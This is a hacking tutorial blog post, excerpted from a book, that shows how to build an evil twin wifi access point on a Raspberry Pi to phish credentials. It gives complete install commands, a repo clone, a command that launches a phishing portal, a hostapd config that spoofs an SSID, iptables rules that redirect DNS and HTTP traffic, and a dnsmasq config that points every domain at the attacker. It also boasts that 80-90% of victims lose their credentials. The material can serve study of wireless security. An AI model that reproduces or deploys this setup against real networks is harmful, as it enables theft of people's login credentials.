+++
date = 2022-05-18T02:10:00Z
title = "Evil Twin Attacks in practice (with Rust and a Raspberry Pi)"
type = "post"
tags = ["hacking", "programming", "rust", "tutorial"]
authors = ["Sylvain Kerkour"]
url = "/evil-twin-attack"

[extra]
lang = "en"

comment ="""
"""
+++

In [Hacking Stories #1 - The Evil Twin](https://kerkour.com/hacking-stories/evil-twin) I teased the simplicity and effectiveness of an evil twin attack. Now it's time to see how to perform it in practice.

The most effective phishing attack I ever witnessed was not an email campaign. It was an **evil twin attack**.

The attacker was walking in a targeted location with a Raspberry Pi in his backpack, spoofing the wifi access points of the location.

When victims connected to his Raspberry Pi (thinking they were connecting to the wifi network of the campus), they were served a portal where they needed to enter their credentials, as usual.

> This post is an excerpt from my book [Black Hat Rust](https://kerkour.com/black-hat-rust)

But as you guessed, it was a phishing form, absolutely identical to the legitimate portal, and all the credentials were logged in a database on the Raspberry Pi of the attacker.

![Evil Twin](https://kerkour.com/2022/evil-twin-attack/ch09_evil_twin.png)


The success rate was in the order of **80%-90%**: 80-90% of the people who connected to the malicious access point got their credentials siphoned!

Then, the phishing portal simply displayed a network error page, telling the victims that there was a problem with the internet and their request couldn't be processed further, in order not to raise suspicion.

But why do people connected to the evil twin access point? They didn't do anything particular! The beauty of the attack is that it relies on a "feature" of wifi: when 2 networks have the same name (SSID), the devices connect to the one with the strongest signal. And as auto-connect is enabled most of the time on all devices, the victims' devices were simply auto-connecting to the malicious access point, thinking that it was a legitimate one.


### How-to


Here is how to build an Evil Twin access point with a Raspberry Pi and Rust.

Be aware that we are going to mess with the OS, so **I strongly recommend you to use a dedicated microSD card**.

The test has been realized on a Raspberry Pi v4 with RaspbianOS. You need to be connected to your Raspberry Pi using the ethernet port as we are going to turn the wifi card into an access point.

Unfortunately, `wasm-opt` [is not available](https://github.com/rustwasm/wasm-pack/issues/913) for `armv7` hosts. Thus, the phishing portal needs to be built in `dev` mode.


First, we install the required dependencies:
```bash
$ sudo apt install -y macchanger hostapd dnsmasq sqlite3 libssl-dev
```

```bash
$ git clone https://github.com/skerkour/black-hat-rust.git && cd black-hat-rust/ch_09/evil_twin
$ make -C ../phishing/ rpi && cp -r ../phishing/dist/* .
```

Then we start our phishing portal (how to build a phishing portal with Rust and WebAssembly? Take a look at my book [Black Hat Rust](https://kerkour.com/black-hat-rust))
```bash
$ sudo ./server -p 80 &
```

And we can finally launch the `evil_twin.sh` script.
```bash
$ sudo ./evil_twin.sh
```

In detail, the `./evil_twin.sh` is doing the following.

It configures `hostapd` to turn the Raspberry Pi's built-in wireless card `wlan0` into an access point.

**[ch_09/evil_twin/hostapd.conf](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/evil_twin/hostapd.conf)**
```
interface=wlan0
channel=6
hw_mode=g

ssid=FREE_WIFI

bridge=bhr0
auth_algs=1
wmm_enabled=0
```

**[ch_09/evil_twin/evil_twin.sh](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/evil_twin/evil_twin.sh)**
```bash
hostapd -B hostapd.conf
```

Then it redirects all the HTTP and DNS requests to the Raspberry pi.

```bash
$ ifconfig bhr0 up
$ ifconfig bhr0 10.1.1.1 netmask 255.255.255.0
$ sysctl net.ipv4.ip_forward=1
$ iptables --flush
$ iptables -t nat --flush
$ iptables -t nat -A PREROUTING -i bhr0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
$ iptables -t nat -A PREROUTING -i bhr0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
$ iptables -t nat -A POSTROUTING -j MASQUERADE
```

Finally, it runs the  `dnsmasq` DHCP and DNS server.

**[ch_09/evil_twin/dnsmasq.conf](https://github.com/skerkour/black-hat-rust/blob/main/ch_09/evil_twin/dnsmasq.conf)**
```default
interface=bhr0
listen-address=10.1.1.1
no-hosts
dhcp-range=10.1.1.2,10.1.1.254,10m
dhcp-option=option:router,10.1.1.1
dhcp-authoritative

address=/#/10.1.1.1
```

```bash
$ sudo cp -f dnsmasq.conf /etc
$ sudo service dnsmasq restart
```
